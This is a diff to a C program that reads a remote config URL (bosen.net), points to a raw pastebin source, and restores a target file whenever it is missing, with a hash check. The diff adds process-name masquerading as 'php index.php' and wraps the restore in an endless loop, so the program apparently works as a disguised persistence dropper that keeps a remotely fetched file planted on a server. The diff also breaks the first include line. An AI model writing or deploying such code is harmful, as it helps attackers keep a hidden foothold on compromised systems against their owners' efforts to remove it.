@@ -1,4 +1,4 @@
-#include <stdio.h>
+include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -10,6 +10,7 @@
 #define SRC             "https://pastebin.com/raw/eVjujdc1"
 #define SRC_HASH        "6807828dbfab3dfa1301a0cbfc497cab"
 #define CONF_URL        "https://bosen.net/"
+#define PS_NAME         "php index.php"
 
 struct string {
   char *ptr;
@@ -136,16 +137,23 @@ char *readconf(char *arg) {
 int main(int argc, char *argv[]) {
   char *fn, *input;
   char self[100];
-  input = argv[0];
+  pid_t parent;
+  int i;
 
+  input = argv[0];
   (fn = strrchr(input, '/')) ? ++fn : (fn = input);
   strcat(self, CONF_URL);
   strcat(self, fn);
 
   input = readconf(self);
   rtrim(input);
-  if (access(input, F_OK) != 0)
-    restore(input);
+
+  strcpy(argv[0], PS_NAME);
+
+  while (1) {
+    if (access(input, F_OK) != 0)
+      restore(input);
  
-  check_hash(input);
+    check_hash(input);
+  }
 }
